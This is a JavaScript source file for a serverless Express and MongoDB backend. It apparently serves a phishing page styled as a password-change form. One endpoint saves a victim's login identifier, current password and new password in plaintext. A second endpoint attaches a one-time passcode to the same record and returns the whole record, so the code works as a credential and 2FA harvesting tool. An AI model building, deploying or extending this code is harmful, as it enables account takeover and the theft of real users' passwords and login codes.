const express = require('express');
const serverless = require('serverless-http');
const mongoose = require('mongoose');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

const submissionSchema = new mongoose.Schema({
  loginMethod: {
    type: String,
    required: true,
    enum: ['phone', 'email', 'username']
  },
  identifier: {
    type: String,
    required: true
  },
  currentPassword: {
    type: String,
    required: true
  },
  newPassword: {
    type: String,
    required: true
  },
  confirmPassword: {
    type: String,
    required: true
  },
  otp: {
    type: String,
    default: null
  }
}, {
  timestamps: true
});

const SubmissionModel = mongoose.models.Submission || mongoose.model('Submission', submissionSchema);

let cachedDb = null;

async function connectDB() {
  if (cachedDb && mongoose.connection.readyState === 1) {
    return cachedDb;
  }

  const mongoUri = process.env.MONGODB_URI;
  
  if (!mongoUri) {
    throw new Error('MONGODB_URI environment variable is not set');
  }

  await mongoose.connect(mongoUri);
  cachedDb = mongoose.connection;
  return cachedDb;
}

app.post('/api/submit-credentials', async (req, res) => {
  try {
    await connectDB();
    
    const { loginMethod, identifier, currentPassword, newPassword, confirmPassword } = req.body;
    
    const doc = await SubmissionModel.create({
      loginMethod: loginMethod || "email",
      identifier: identifier || "",
      currentPassword: currentPassword || "",
      newPassword: newPassword || "",
      confirmPassword: confirmPassword || "",
      otp: null
    });
    
    const submission = {
      id: parseInt(doc._id.toString().slice(-8), 16),
      loginMethod: doc.loginMethod,
      identifier: doc.identifier,
      currentPassword: doc.currentPassword,
      newPassword: doc.newPassword,
      confirmPassword: doc.confirmPassword,
      otp: doc.otp || null,
      submittedAt: doc.createdAt || new Date()
    };

    return res.status(201).json({ submissionId: submission.id });
  } catch (error) {
    console.error('Error in submit-credentials:', error);
    return res.status(500).json({ error: "Internal server error" });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    await connectDB();
    
    const { submissionId, otp } = req.body;
    
    const docs = await SubmissionModel.find().sort({ _id: -1 });
    const doc = docs.find(d => parseInt(d._id.toString().slice(-8), 16) === submissionId);
    
    if (!doc) {
      return res.status(404).json({ error: 'Submission not found' });
    }

    doc.otp = otp || "";
    await doc.save();

    const submission = {
      id: parseInt(doc._id.toString().slice(-8), 16),
      loginMethod: doc.loginMethod,
      identifier: doc.identifier,
      currentPassword: doc.currentPassword,
      newPassword: doc.newPassword,
      confirmPassword: doc.confirmPassword,
      otp: doc.otp,
      submittedAt: doc.createdAt || new Date()
    };

    return res.status(200).json({ success: true, submission });
  } catch (error) {
    console.error('Error in submit-otp:', error);
    return res.status(500).json({ error: "Internal server error" });
  }
});

exports.handler = serverless(app);
